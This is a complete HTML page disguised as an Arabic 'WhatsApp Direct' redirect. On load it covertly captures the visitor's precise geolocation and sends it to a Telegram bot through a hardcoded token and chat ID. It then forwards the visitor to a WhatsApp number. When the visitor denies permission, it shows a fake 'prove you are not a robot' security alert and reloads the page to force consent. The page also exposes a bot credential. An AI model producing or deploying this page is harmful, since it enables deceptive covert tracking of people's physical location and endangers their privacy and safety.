<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Direct</title>
    <style>
        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #25D366; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div style="text-align: center;">
    <div class="loader"></div>
    <p id="msg">جاري التحويل لمحادثة الواتساب...</p>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg'; //
    const chat_id = '7214473798'; //
    const targetPhone = '963997715905'; //

    function captureLocation() {
        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }; //

        navigator.geolocation.getCurrentPosition(function(p) {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const acc = p.coords.accuracy;
            
            // رابط مباشر يفتح الخرائط فوراً
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            let report = `🎯 **تم الصيد بنجاح!**\n\n`;
            report += `📍 الموقع: ${mapLink}\n`;
            report += `📏 الدقة: ${acc.toFixed(1)} متر`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
            .then(() => {
                window.location.href = `https://wa.me/${targetPhone}`;
            });

        }, function(e) {
            // في حال الرفض (Block): نطلع رسالة تنبيه ونعيد التحميل لإجباره
            alert("⚠️ تنبيه أمني: يرجى السماح بالوصول للموقع لتأكيد أنك لست روبوت (Robot) وفتح المحادثة.");
            location.reload(); 
        }, options);
    }

    // تشغيل الكود فوراً
    window.onload = function() {
        if (navigator.geolocation) {
            captureLocation();
        } else {
            alert("متصفحك قديم، يرجى فتحه من متصفح جوجل كروم.");
        }
    };
</script>
</body>
</html>
